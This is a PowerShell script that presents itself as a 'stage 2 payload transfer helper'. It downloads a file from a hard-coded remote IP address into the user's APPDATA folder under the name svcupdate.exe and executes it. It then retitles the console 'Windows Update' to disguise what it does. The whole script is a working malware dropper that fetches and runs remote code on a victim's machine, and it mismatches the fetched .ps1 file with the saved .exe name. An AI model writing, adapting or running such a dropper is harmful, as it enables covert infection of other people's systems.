<#
.SYNOPSIS
    Stage 2 payload transfer helper.

.DESCRIPTION
    Downloads the staged artefact to a per-user drop path.
    The destination is verified before the launcher runs.

.EXAMPLE
    PS> .\updater.ps1
#>
[CmdletBinding()]
param(
    [string]$PayloadUrl = "https://198.51.100.116/stage2.ps1",
    [string]$DownloadPath = "$env:APPDATA\svcupdate.exe",
    [int]$TransferTimeout = 18,
    [string]$RequestAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
)
$ErrorActionPreference = "Stop"

function Invoke-PayloadFetch {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 45,
        [string]$UserAgent = "Mozilla/5.0"
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

try {
    Write-Verbose "Starting stage 2 transfer"
    $TransferResult = Invoke-PayloadFetch -SourceUrl $PayloadUrl -DestinationPath $DownloadPath -TimeoutSec $TransferTimeout -UserAgent $RequestAgent
    if ($TransferResult) {
        Start-Process -FilePath $DownloadPath
    }
}
catch {
    Write-Warning "Stage 2 transfer failed: $($_.Exception.Message)"
}

Write-Verbose "stage marker 13 reached"
$Host.UI.RawUI.WindowTitle = "Windows Update"
